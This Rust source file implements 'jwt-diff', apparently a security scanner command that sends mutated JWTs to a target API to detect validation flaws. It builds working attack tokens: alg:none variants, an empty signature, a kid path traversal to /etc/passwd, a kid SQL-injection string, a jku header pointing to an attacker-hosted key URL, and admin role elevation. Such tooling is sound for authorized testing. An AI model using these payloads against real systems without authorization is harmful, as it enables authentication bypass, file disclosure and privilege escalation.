//! `wafrift jwt-diff`: JWT signature / claim validation scanner.
//!
//! ## What this finds
//!
//! Many APIs that use JWT tokens have validation bugs:
//!
//! - **`alg:none`**: server skips signature validation when the
//!   header declares `"alg":"none"`. Trivial bypass.
//! - **Algorithm-case confusion**: `"alg":"None"` or `"NONE"` or
//!   `"nOnE"`; libraries that case-match strictly accept the variant.
//! - **Empty signature on HS256**: server logs alg:HS256 but skips
//!   sig check when the signature segment is empty.
//! - **Expired exp / future nbf accepted**: server doesn't actually
//!   validate the time claims.
//! - **`kid` traversal**: server uses `kid` as a path to look up
//!   keys, allowing `../../etc/passwd` or arbitrary file read.
//! - **`kid` SQL injection**: server uses `kid` in a DB lookup
//!   without parameterisation.
//! - **`jku`/`x5u` attacker-controlled URL**: server fetches the
//!   key from the URL in the header; attacker hosts a malicious
//!   JWK set.
//!
//! Each probe takes a KNOWN-valid JWT from the operator, mutates
//! the header / payload / signature, and re-fires the request.
//! Compares response status / body to the baseline. Acceptance of
//! a mutated token = validation bug.

use std::process::ExitCode;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use clap::Args;
use colored::Colorize;
use reqwest::Client;
use serde_json::{Value, json};
use tokio::sync::Semaphore;

#[cfg(test)]
use wafrift_transport::jwt::b64url_decode;
use wafrift_transport::jwt::{b64url_encode, decode_b64url_json};

use crate::parser_diff_common::{body_delta_pct, severity_of};

#[derive(Args, Debug)]
pub(crate) struct JwtDiffArgs {
    /// Target URL, the protected resource that requires the JWT
    /// in its `Authorization: Bearer <jwt>` header.
    pub url: String,

    /// KNOWN-valid JWT, the baseline that the server is expected
    /// to accept. Each probe mutates THIS token. Typically the
    /// operator just logged in and captured the token from their
    /// browser / curl.
    #[arg(long)]
    pub token: String,

    /// Inter-request delay (ms).
    #[arg(long, default_value_t = 25)]
    pub delay_ms: u64,

    /// Max concurrent in-flight probes.
    #[arg(long, default_value_t = 4)]
    pub concurrency: usize,

    /// HTTP timeout per probe (seconds).
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Skip TLS cert verification.
    #[arg(long)]
    pub insecure: bool,

    /// HTTP proxy (Burp).
    #[arg(long, value_name = "URL")]
    pub proxy: Option<String>,

    /// Extra headers (beyond Authorization, which carries the
    /// baseline JWT per probe).
    #[arg(long, short = 'H', value_name = "HEADER", num_args = 0..)]
    pub header: Vec<String>,

    /// HTTP method to use for both baseline + probes. JWT-protected
    /// endpoints are commonly POST (GraphQL mutations, REST writes);
    /// the GET default was silently returning 405/404 on those and
    /// the diff falsely reported "no divergence", not because the
    /// server validated the JWT correctly, but because every probe
    /// was the wrong shape. Accepts any HTTP method name.
    #[arg(long, default_value = "GET", value_name = "METHOD")]
    pub method: String,

    /// Optional request body for non-GET methods. Sent verbatim;
    /// pair with `-H 'Content-Type: ...'` if the endpoint needs it.
    #[arg(long, value_name = "BODY")]
    pub body: Option<String>,

    /// Output format: `text` (default) or `json`.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Quiet mode.
    #[arg(long, default_value_t = false)]
    pub quiet: bool,
}

/// One JWT validation probe.
#[derive(Debug, Clone)]
pub(crate) struct JwtProbe {
    pub kind: &'static str,
    pub description: &'static str,
    /// The mutated JWT to send.
    pub mutated_token: String,
}

#[derive(Debug, Clone, serde::Serialize)]
pub(crate) struct JwtDiffResult {
    pub kind: &'static str,
    pub description: &'static str,
    pub probe_status: u16,
    pub baseline_status: u16,
    pub body_delta_pct: f64,
    pub baseline_body_len: usize,
    pub probe_body_len: usize,
    pub curl_cmd: String,
    pub severity: &'static str,
}

/// Generate the JWT-mutation probe set. Pure function. Takes the
/// operator's baseline token and forks it N ways.
#[must_use]
pub(crate) fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
    let mut out = Vec::new();
    let parts: Vec<&str> = baseline.split('.').collect();
    if parts.len() != 3 {
        // Not a JWT, return an empty set; the runner will detect
        // this and surface an error rather than fire garbage probes.
        return out;
    }
    let (header_b64, payload_b64, _sig_b64) = (parts[0], parts[1], parts[2]);
    let header = decode_b64url_json(header_b64).unwrap_or_else(|| json!({}));
    let payload = decode_b64url_json(payload_b64).unwrap_or_else(|| json!({}));

    // ── alg:none family ──
    out.push(JwtProbe {
        kind: "alg-none-lowercase",
        description: "alg:`none`: strips signature; server that skips sig check on \
             alg:none accepts a freely-modified payload",
        mutated_token: build_jwt(&with_alg(&header, "none"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-capital",
        description: "alg:`None`: case-fold confusion; libraries that string-compare \
             alg case-sensitively reject lowercase but accept the variant",
        mutated_token: build_jwt(&with_alg(&header, "None"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-allcaps",
        description: "alg:`NONE`: third case variant",
        mutated_token: build_jwt(&with_alg(&header, "NONE"), &payload, ""),
    });
    out.push(JwtProbe {
        kind: "alg-none-mixed",
        description: "alg:`nOnE`: mixed case (alternating)",
        mutated_token: build_jwt(&with_alg(&header, "nOnE"), &payload, ""),
    });

    // ── Empty signature with original alg preserved ──
    out.push(JwtProbe {
        kind: "empty-sig-original-alg",
        description: "alg preserved (e.g. HS256) but signature segment is empty. \
             servers that look only at header.alg before verifying sig may \
             accept",
        mutated_token: build_jwt(&header, &payload, ""),
    });

    // ── kid traversal ──
    out.push(JwtProbe {
        kind: "kid-path-traversal",
        description: "`kid` header field set to `../../../etc/passwd`: servers that \
             use kid as a path to look up keys may read arbitrary files",
        mutated_token: build_jwt(
            &with_field(&header, "kid", json!("../../../etc/passwd")),
            &payload,
            "",
        ),
    });
    out.push(JwtProbe {
        kind: "kid-sql-injection",
        description: "`kid` SQL-payload, servers that look up kid in a DB without \
             parameterisation are vulnerable",
        mutated_token: build_jwt(
            &with_field(&header, "kid", json!("x' UNION SELECT 'secret'--")),
            &payload,
            "",
        ),
    });

    // ── jku / x5u attacker-URL ──
    out.push(JwtProbe {
        kind: "jku-attacker-url",
        description: "`jku` header set to attacker-hosted JWK set URL, servers that \
             fetch keys from operator-controlled URLs accept attacker-signed \
             tokens",
        mutated_token: build_jwt(
            &with_field(&header, "jku", json!("https://attacker.example/jwks.json")),
            &payload,
            "",
        ),
    });

    // ── Expired exp ──
    out.push(JwtProbe {
        kind: "expired-exp",
        description: "`exp` claim set to a date 10 years in the past, servers that \
             don't validate exp accept stale tokens forever",
        mutated_token: build_jwt(
            &header,
            &with_field(&payload, "exp", json!(1_600_000_000_u64)),
            "",
        ),
    });

    // ── Future nbf ──
    out.push(JwtProbe {
        kind: "future-nbf",
        description: "`nbf` (not-before) claim set to far future, servers that don't \
             validate nbf accept tokens that 'aren't valid yet'",
        mutated_token: build_jwt(
            &header,
            &with_field(&payload, "nbf", json!(99_999_999_999_u64)),
            "",
        ),
    });

    // ── Privilege escalation in payload ──
    out.push(JwtProbe {
        kind: "role-elevation",
        description: "Set common admin fields (`role:admin`, `is_admin:true`, \
             `permissions:[\"*\"]`) in the payload, servers that don't \
             validate sig let the elevated token through",
        mutated_token: {
            let elevated = with_field(&payload, "role", json!("admin"));
            let elevated = with_field(&elevated, "is_admin", json!(true));
            let elevated = with_field(&elevated, "permissions", json!(["*"]));
            build_jwt(&with_alg(&header, "none"), &elevated, "")
        },
    });

    out
}

pub(crate) async fn run_jwt_diff(mut args: JwtDiffArgs) -> ExitCode {
    args.url = crate::helpers::normalize_target_url(&args.url);
    if args.token.split('.').count() != 3 {
        eprintln!(
            "{} --token does not look like a JWT (must be `<header>.<payload>.<signature>`)",
            "Input error:".red().bold()
        );
        return ExitCode::from(2);
    }
    let http = match crate::parser_diff_common::build_diff_http_client_for(&args) {
        Ok(c) => c,
        Err(code) => return code,
    };

    if !args.quiet && args.format == "text" {
        eprintln!(
            "{} probing {} JWT mutations against {}",
            "[wafrift jwt-diff]".bright_cyan().bold(),
            generate_jwt_variants(&args.token)
                .len()
                .to_string()
                .bold()
                .yellow(),
            args.url.bright_white()
        );
    }

    let baseline = match fire_with_bearer(
        &http,
        &args.url,
        &args.method,
        args.body.as_deref(),
        &args.token,
    )
    .await
    {
        Ok(v) => v,
        Err(e) => {
            eprintln!(
                "  {} baseline probe failed: {e}",
                "✗ Transport error:".red().bold()
            );
            return ExitCode::from(1);
        }
    };
    let (baseline_status, baseline_body_len) = baseline;
    if !args.quiet && args.format == "text" {
        eprintln!(
            "  {} baseline (real token): HTTP {} ({} bytes)",
            "↘".bright_black(),
            baseline_status,
            baseline_body_len
        );
    }

    let variants = generate_jwt_variants(&args.token);
    let sem = Arc::new(Semaphore::new(args.concurrency.max(1)));
    let http_arc = Arc::new(http);
    let url_arc = Arc::new(args.url.clone());
    let method_arc = Arc::new(args.method.clone());
    let body_arc = Arc::new(args.body.clone());
    let counter = Arc::new(AtomicUsize::new(0));

    let mut handles = Vec::with_capacity(variants.len());
    for v in variants {
        let permit = sem
            .clone()
            .acquire_owned()
            .await
            .expect("semaphore is never closed");
        let http = http_arc.clone();
        let url = url_arc.clone();
        let method = method_arc.clone();
        let body = body_arc.clone();
        let counter = counter.clone();
        let delay = Duration::from_millis(args.delay_ms);
        handles.push(tokio::spawn(async move {
            let _permit = permit;
            if !delay.is_zero() {
                tokio::time::sleep(delay).await;
            }
            let result =
                fire_with_bearer(&http, &url, &method, body.as_deref(), &v.mutated_token).await;
            counter.fetch_add(1, Ordering::SeqCst);
            (v, result)
        }));
    }

    let mut results: Vec<JwtDiffResult> = Vec::new();
    let mut errors = 0u32;
    for h in handles {
        let (variant, outcome) = h.await.unwrap_or_else(|e| {
            (
                JwtProbe {
                    kind: "join-error",
                    description: "tokio join failed",
                    mutated_token: String::new(),
                },
                Err(format!("{e}")),
            )
        });
        match outcome {
            Ok((probe_status, probe_body_len)) => {
                let body_delta = body_delta_pct(baseline_body_len, probe_body_len);
                let severity = severity_of(baseline_status, probe_status, body_delta);
                let curl_cmd = render_curl(&args.url, &variant.mutated_token);
                results.push(JwtDiffResult {
                    kind: variant.kind,
                    description: variant.description,
                    probe_status,
                    baseline_status,
                    body_delta_pct: body_delta,
                    baseline_body_len,
                    probe_body_len,
                    curl_cmd,
                    severity,
                });
            }
            Err(_) => errors += 1,
        }
    }

    emit_output(&args, &results, baseline_status, baseline_body_len, errors);
    ExitCode::SUCCESS
}

async fn fire_with_bearer(
    http: &Client,
    url: &str,
    method: &str,
    body: Option<&str>,
    token: &str,
) -> Result<(u16, usize), String> {
    let method = reqwest::Method::from_bytes(method.as_bytes())
        .map_err(|e| format!("invalid method {method:?}: {e}"))?;
    let mut req = http
        .request(method, url)
        .header("Authorization", format!("Bearer {token}"));
    if let Some(b) = body {
        req = req.body(b.to_string());
    }
    let resp = req.send().await.map_err(|e| format!("{e}"))?;
    let status = resp.status().as_u16();
    // §15 OOM / decompression-bomb: cap the body read.
    let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
        .await
        .map_err(|e| format!("{e}"))?;
    Ok((status, body.len()))
}

crate::impl_parser_diff_http_args!(JwtDiffArgs);

fn render_curl(url: &str, token: &str) -> String {
    let auth_header = vec![("Authorization".to_string(), format!("Bearer {token}"))];
    crate::helpers::render_simple_curl(None, url, &auth_header, None)
}

fn emit_output(
    args: &JwtDiffArgs,
    results: &[JwtDiffResult],
    baseline_status: u16,
    baseline_body_len: usize,
    errors: u32,
) {
    let (high, medium) = crate::parser_diff_common::count_high_medium(results, |r| r.severity);

    if args.format == "json" {
        let out = json!({
            "target": args.url,
            "baseline_status": baseline_status,
            "baseline_body_len": baseline_body_len,
            "probes": results.len(),
            "errors": errors,
            "divergences": { "high": high, "medium": medium },
            "results": results,
        });
        crate::parser_diff_common::print_pretty_json(&out);
        return;
    }

    if !args.quiet {
        crate::parser_diff_common::print_text_summary(
            "jwt-diff",
            "mutation(s) accepted by target",
            high,
            medium,
            errors,
        );
    }

    for r in results.iter().filter(|r| r.severity != "none") {
        let badge = crate::parser_diff_common::severity_badge(r.severity);
        println!();
        println!("  [{badge}] {}: {}", r.kind.bold(), r.description);
        crate::parser_diff_common::print_baseline_probe_arrow(
            r.baseline_status,
            r.baseline_body_len,
            r.probe_status,
            r.probe_body_len,
            r.body_delta_pct,
        );
        println!("    {}", r.curl_cmd);
    }
}

// ── JWT construction helper ──────────────────────────────────
//
// b64url_encode / b64url_decode / decode_b64url_json are the
// canonical primitives from wafrift_transport::jwt (RFC 7515 §2).
// They are imported above (do NOT re-implement here).

fn build_jwt(header: &Value, payload: &Value, sig: &str) -> String {
    let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
    let p = b64url_encode(
        serde_json::to_string(payload)
            .unwrap_or_default()
            .as_bytes(),
    );
    format!("{h}.{p}.{sig}")
}

fn with_alg(header: &Value, alg: &str) -> Value {
    with_field(header, "alg", json!(alg))
}

fn with_field(obj: &Value, key: &str, val: Value) -> Value {
    let mut m = obj
        .as_object()
        .cloned()
        .unwrap_or_else(serde_json::Map::new);
    m.insert(key.to_string(), val);
    Value::Object(m)
}

#[cfg(test)]
#[path = "jwt_diff_cmd_tests.rs"]
mod tests;
